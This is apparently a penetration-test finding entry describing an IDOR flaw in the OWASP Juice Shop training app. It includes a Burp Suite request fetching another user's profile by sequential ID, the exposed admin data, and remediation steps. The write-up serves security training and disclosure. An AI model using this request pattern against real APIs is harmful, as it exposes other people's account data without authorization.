VULN-004 IDOR ‚Äî Insecure Direct Object Reference on User API Critical
CVSS: 8.8
Target: Juice Shop
OWASP: A01:2021 ‚Äì Broken Access Control
Endpoint: GET /api/Users/:id
The REST API returns any user's full profile using a sequential integer ID without validating that the requester is authorized to view that resource.
# Burp Suite Repeater ‚Äî IDOR test GET /api/Users/1 HTTP/1.1 Host: localhost:3000 Authorization: Bearer <any_valid_token> # Response ‚Äî Admin data exposed { "data": { "id": 1, "email": "admin@juice-sh.op", "role": "admin" } }
üì∏ Evidence Screenshot
screenshots/idor-user-data.png
Remediation
Implement server-side ownership checks. Use UUIDs instead of sequential IDs. Validate user identity against requested resource on every API call.
